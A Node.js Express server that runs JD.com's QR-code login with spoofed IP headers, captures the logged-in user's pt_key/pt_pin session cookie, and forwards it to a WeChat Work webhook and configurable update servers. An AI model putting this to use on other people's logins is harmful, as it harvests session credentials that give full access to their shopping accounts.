// 填入你的配置，或者通过环境变量传入
const QYWX_KEY =
    process.env.QYWX_KEY && process.env.QYWX_KEY.length > 0 ?
    process.env.QYWX_KEY :
    '';
// 尽量不用@all，除非只有你一个人
const QYWX_AM =
    process.env.QYWX_AM && process.env.QYWX_AM.length > 0 ?
    process.env.QYWX_AM :
    '';
// 支持多个服务器推送，用|隔开 http://1.com/updateCookie|http://2.com/updateCookie
const UPDATE_API =
    process.env.UPDATE_API && process.env.UPDATE_API.length > 0 ?
    process.env.UPDATE_API :
    '';

const express = require('express');
const got = require('got');
const path = require('path');
const bodyParser = require('body-parser');
const cors = require('cors');
const app = express();
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
const qs = require('querystring');
/**
 * 字符串工具函数
 * 从 'xxx=yyy' 中提取 'yyy'
 *
 * @param {*} key
 * @return {string} value
 */
const transformKey = (key) => {
    return key.substring(key.indexOf('=') + 1, key.indexOf(';'));
};

/**
 * 随机字符串
 *
 * @param {number} [length=6]
 * @return {*}
 */
const ramdomString = (length = 6) => {
    var str = 'abcdefghijklmnopqrstuvwxyz';
    str += str.toUpperCase();
    str += '0123456789';
    var _str = '';
    for (let i = 0; i < length; i++) {
        var rand = Math.floor(Math.random() * str.length);
        _str += str[rand];
    }
    return _str;
};

/**
 * 通过res获取cookie
 * 此cookie用来请求二维码
 *
 * @param {*} response
 * @return {*}
 */
const praseSetCookies = (response) => {
    const s_token = response.body.s_token;
    const guid = transformKey(response.headers['set-cookie'][0]);
    const lsid = transformKey(response.headers['set-cookie'][2]);
    const lstoken = transformKey(response.headers['set-cookie'][3]);
    const cookies = `guid=${guid}; lang=chs; lsid=${lsid}; lstoken=${lstoken};`;
    return {
        s_token,
        guid,
        lsid,
        lstoken,
        cookies,
    };
};

/**
 * 通过res解析headers获得cookie
 *
 * @param {*} response
 * @return {string} userCookie
 */
const getCookie = (response) => {
    // 注释的参数没用，如果二次修改请自行研究
    // const TrackerID = transformKey(response.headers['set-cookie'][0]);
    // const pt_token = transformKey(response.headers['set-cookie'][3]);
    // const pwdt_id = transformKey(response.headers['set-cookie'][4]);
    // const s_key = transformKey(response.headers['set-cookie'][5]);
    // const s_pin = transformKey(response.headers['set-cookie'][6]);

    const pt_key = transformKey(response.headers['set-cookie'][1]);
    const pt_pin = transformKey(response.headers['set-cookie'][2]);
    const userCookie = `pt_key=${pt_key};pt_pin=${pt_pin};`;
    console.log({
        msg: '登录成功',
        time: new Date().toISOString(),
        userCookie,
        pt_pin,
    });
    return userCookie;
};

/**
 * 初始化请求二维码的参数
 *
 */
async function step1() {
    const timeStamp = new Date().getTime();
    const loginUrl =
        'https://plogin.m.jd.com/cgi-bin/mm/new_login_entrance?lang=chs&appid=300' +
        `&returnurl=https://wq.jd.com/passport/LoginRedirect?state=${timeStamp}` +
        '&returnurl=https://home.m.jd.com/myJd/newhome.action?sceneval=2&ufc=&/myJd/home.action&source=wq_passport';

    const response = await got(loginUrl, {
        responseType: 'json',
        headers: {
            Connection: 'Keep-Alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            Accept: 'application/json, text/plain, */*',
            'Accept-Language': 'zh-cn',
            'X-Forwarded-For': '192.168.0.1',
            Referer: 'https://plogin.m.jd.com/login/login?appid=300' +
                `&returnurl=https://wq.jd.com/passport/LoginRedirect?state=${timeStamp}` +
                '&returnurl=https://home.m.jd.com/myJd/newhome.action?sceneval=2&ufc=&/myJd/home.action&source=wq_passport',
            'User-Agent': 'jdapp;android;10.0.5;11;0393465333165363-5333430323261366;network/wifi;model/M2102K1C;osVer/30;appBuild/88681;partner/lc001;eufv/1;jdSupportDarkMode/0;Mozilla/5.0 (Linux; Android 11; M2102K1C Build/RKQ1.201112.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.120 MQQBrowser/6.2 TBS/045534 Mobile Safari/537.36',
            Host: 'plogin.m.jd.com',
        },
    });

    return praseSetCookies(response);
}

/**
 * 获取二维码链接
 *
 * @param {*} cookiesObj
 * @return {*}
 */
async function step2(cookiesObj) {
    const { s_token, guid, lsid, lstoken, cookies } = cookiesObj;
    if (cookies == '') {
        throw new Error('获取失败');
    }
    const timeStamp = new Date().getTime();
    const getQRUrl =
        'https://plogin.m.jd.com/cgi-bin/m/tmauthreflogurl?s_token=' +
        `${s_token}&v=${timeStamp}&remember=true`;
    const response = await got.post(getQRUrl, {
        responseType: 'json',
        json: {
            lang: 'chs',
            appid: 300,
            returnurl: `https://wqlogin2.jd.com/passport/LoginRedirect?state=${timeStamp}` +
                '&returnurl=//home.m.jd.com/myJd/newhome.action?sceneval=2&ufc=&/myJd/home.action',
            source: 'wq_passport',
        },
        headers: {
            'Client-IP': '0.0.0.0',
            Connection: 'Keep-Alive',
            'Content-Type': 'application/x-www-form-urlencoded; Charset=UTF-8',
            Accept: 'application/json, text/plain, */*',
            'X-Forwarded-For': '0.0.0.0',
            Cookie: cookies,
            Referer: 'https://plogin.m.jd.com/login/login?appid=300' +
                `&returnurl=https://wqlogin2.jd.com/passport/LoginRedirect?state=${timeStamp}` +
                '&returnurl=//home.m.jd.com/myJd/newhome.action?sceneval=2&ufc=&/myJd/home.action&source=wq_passport',
            'User-Agent': 'jdapp;android;10.0.5;11;0393465333165363-5333430323261366;network/wifi;model/M2102K1C;osVer/30;appBuild/88681;partner/lc001;eufv/1;jdSupportDarkMode/0;Mozilla/5.0 (Linux; Android 11; M2102K1C Build/RKQ1.201112.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.120 MQQBrowser/6.2 TBS/045534 Mobile Safari/537.36',
            Host: 'plogin.m.jd.com',
        },
    });
    const token = response.body.token;
    const okl_token = transformKey(response.headers['set-cookie'][0]);
    const qrCodeUrl = `https://plogin.m.jd.com/cgi-bin/m/tmauth?appid=300&client_type=m&token=${token}`;
    return {
        ...cookiesObj,
        qrCodeUrl,
        okl_token,
        token,
        cookies: `okl_token=${okl_token};` + cookies,
    };
}

/**
 * 通过前端传回的参数获得cookie
 *
 * @param {*} user
 * @return {*}
 */
async function checkLogin(user) {
    const { s_token, guid, lsid, lstoken, cookies, okl_token, token } = user;
    const timeStamp = new Date().getTime();
    const getUserCookieUrl =
        `https://plogin.m.jd.com/cgi-bin/m/tmauthchecktoken?&token=${token}` +
        `&ou_state=1&okl_token=${okl_token}`;
    const response = await got.post(getUserCookieUrl, {
        responseType: 'json',
        body: qs.stringify({
            lang: 'chs',
            appid: 300,
            returnurl: 'https://wqlogin2.jd.com/passport/LoginRedirect?state=1100399130787&returnurl=//home.m.jd.com/myJd/newhome.action?sceneval=2&ufc=&/myJd/home.action',
            source: 'wq_passport',
        }),
        headers: {
            'Client-IP': '0.0.0.0',
            'X-Forwarded-For': '0.0.0.0',
            Referer: 'https://plogin.m.jd.com/login/login?appid=300' +
                `&returnurl=https://wqlogin2.jd.com/passport/LoginRedirect?state=${timeStamp}` +
                '&returnurl=//home.m.jd.com/myJd/newhome.action?sceneval=2&ufc=&/myJd/home.action&source=wq_passport',
            Cookie: cookies,
            Connection: 'Keep-Alive',
            'Content-Type': 'application/x-www-form-urlencoded; Charset=UTF-8',
            Accept: 'application/json, text/plain, */*',
            'User-Agent': 'jdapp;android;10.0.5;11;0393465333165363-5333430323261366;network/wifi;model/M2102K1C;osVer/30;appBuild/88681;partner/lc001;eufv/1;jdSupportDarkMode/0;Mozilla/5.0 (Linux; Android 11; M2102K1C Build/RKQ1.201112.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.120 MQQBrowser/6.2 TBS/045534 Mobile Safari/537.36',
        },
    });
    return response;
}

/**
 * 获取登录口令
 *
 * @param {*} url
 * @return {*} code
 */
async function getJDCode(url) {
    const timeStamp = new Date().getTime();
    const getCodeUrlObj = new URL(
        'https://api.m.jd.com/api?functionId=jCommand&appid=u&client=apple&clientVersion=8.3.6'
    );
    getCodeUrlObj.searchParams.set(
        'body',
        JSON.stringify({
            appCode: 'jApp',
            command: {
                keyEndTime: timeStamp + 3 * 60 * 1000,
                keyTitle: '【口令登录】点击->立即查看去登录',
                url: url,
                keyChannel: 'Wxfriends',
                keyId: ramdomString(28),
                sourceCode: 'jUnion',
                keyImg: 'https://img14.360buyimg.com/imagetools/jfs/t1/188781/6/3393/253109/60a53002E2cd2ea37/17eabc4b8272021b.jpg',
                keyContent: '',
                acrossClient: '0',
            },
        })
    );

    const response = await got.get(getCodeUrlObj.toString(), {
        responseType: 'json',
        headers: {
            'X-Forwarded-For': '192.168.0.1',
            Host: 'api.m.jd.com',
            accept: '*/*',
            'accept-language': 'zh-cn',
            'User-Agent': 'jdapp;android;10.0.5;11;0393465333165363-5333430323261366;network/wifi;model/M2102K1C;osVer/30;appBuild/88681;partner/lc001;eufv/1;jdSupportDarkMode/0;Mozilla/5.0 (Linux; Android 11; M2102K1C Build/RKQ1.201112.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.120 MQQBrowser/6.2 TBS/045534 Mobile Safari/537.36',
        },
    });
    return response.body;
}

/**
 * 发送消息推送
 *
 * @param {*} msg
 */
async function sendMsg(updateMsg, cookie, userMsg) {
    // 企业微信群机器人
    if (QYWX_KEY) {
        try {
            await got.post(
                `https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=${QYWX_KEY}`, {
                    responseType: 'json',
                    json: {
                        msgtype: 'text',
                        text: {
                            content: `====获取到cookie====\n${updateMsg}\n用户备注：${userMsg}\n${cookie}`,
                        },
                    },
                }
            );
        } catch (err) {
            console.log({
                msg: '企业微信群机器人消息发送失败',
            });
        }
    }
    if (QYWX_AM) {
        try {
            const [corpid, corpsecret, userId, agentid] = QYWX_AM.split(',');
            const getToken = await got.post({
                url: `https://qyapi.weixin.qq.com/cgi-bin/gettoken`,
                json: {
                    corpid,
                    corpsecret,
                },
                headers: {
                    'Content-Type': 'application/json',
                },
                timeout: 10000,
            });
            const accessToken = JSON.parse(getToken.body).access_token;
            const res = await got.post({
                url: `https://qyapi.weixin.qq.com/cgi-bin/message/send?access_token=${accessToken}`,
                json: {
                    touser: userId,
                    agentid,
                    safe: '0',
                    msgtype: 'text',
                    text: {
                        content: `====获取到cookie====\n${updateMsg}\n用户备注：${userMsg}\n${cookie}`,
                    },
                },
                headers: {
                    'Content-Type': 'application/json',
                },
                timeout: 10000,
            });
        } catch (err) {
            console.log({
                msg: '企业微信应用消息发送失败',
            });
        }
    }
}

/**
 * 自动更新服务
 *
 * @param {*} ucookie
 * @return {string} msg
 *
 */
async function updateCookie(cookie, userMsg) {
    let msg = '';
    if (UPDATE_API) {
        try {
            if (UPDATE_API.split('|').length > 1) {
                const updateHosts = UPDATE_API.split('|');
                let hostIndex = 1;
                for await (const updateUrl of updateHosts) {
                    console.log(updateUrl);
                    try {
                        const res = await got.post({
                            url: updateUrl,
                            json: {
                                cookie,
                                userMsg,
                                defaultStatus: false,
                                defaultName: userMsg,
                                defaultWeight: 1,
                            },
                            timeout: 10000,
                        });
                        console.log(res.body);
                        msg += `服务器${hostIndex}:${JSON.parse(res.body).msg}\n`;
                    } catch (error) {
                        msg += `服务器${hostIndex}:更新失败\n`;
                    }
                    hostIndex += 1;
                }
                return msg;
            } else if (UPDATE_API.startsWith('http')) {
                const res = await got.post({
                    url: UPDATE_API,
                    json: {
                        cookie,
                        userMsg,
                        defaultStatus: false,
                        defaultName: userMsg,
                        defaultWeight: 1,
                    },
                    timeout: 10000,
                });
                msg += JSON.parse(res.body).msg;
                return msg;
            } else {
                return '更新地址配置错误';
            }
        } catch (err) {
            // console.log(err);
            console.log({
                msg: 'Cookie 更新接口失败',
            });
            return '';
        }
    }
    return '';
}

/**
 * 对ck进行处理
 * @param {*} cookie
 * @return {*}
 */
async function cookieFlow(cookie, userMsg) {
    try {
        const updateMsg = await updateCookie(cookie, userMsg);
        await sendMsg(updateMsg, cookie, userMsg);
        return msg;
    } catch (err) {
        return '';
    }
}

/**
 * API 获取二维码链接
 */
app.get('/qrcode', function(request, response) {
    (async() => {
        try {
            const cookiesObj = await step1();
            const user = await step2(cookiesObj);
            const getCodeBody = await getJDCode(user.qrCodeUrl);
            response.send({
                err: 0,
                qrcode: user.qrCodeUrl,
                user,
                jdCode: getCodeBody.data,
            });
        } catch (err) {
            response.send({ err: 2, msg: '错误' });
        }
    })();
});

/**
 * API 获取返回的cookie信息
 */
app.post('/cookie', function(request, response) {
    const user = request.body.user;
    const userMsg = request.body.msg;
    if (user && user.cookies != '') {
        (async() => {
            try {
                const cookie = await checkLogin(user);
                if (cookie.body.errcode == 0) {
                    let ucookie = getCookie(cookie);
                    await cookieFlow(ucookie, userMsg);
                    response.send({ err: 0, cookie: ucookie, msg: '更新成功' });
                } else {
                    response.send({
                        err: cookie.body.errcode,
                        msg: cookie.body.message,
                        body: cookie.body,
                    });
                }
            } catch (err) {
                response.send({ err: 1, msg: err });
            }
        })();
    } else {
        response.send({ err: 2, msg: '获取失败' });
    }
});

app.get('/', function(request, response) {
    response.send({ code: 404 });
});

// 本地运行开启以下
const PORT = 7789;
app.listen(PORT, () => {
    console.log(`应用正在监听 ${PORT} 端口!`);
});

// 云函数运行开启以下
module.exports = app;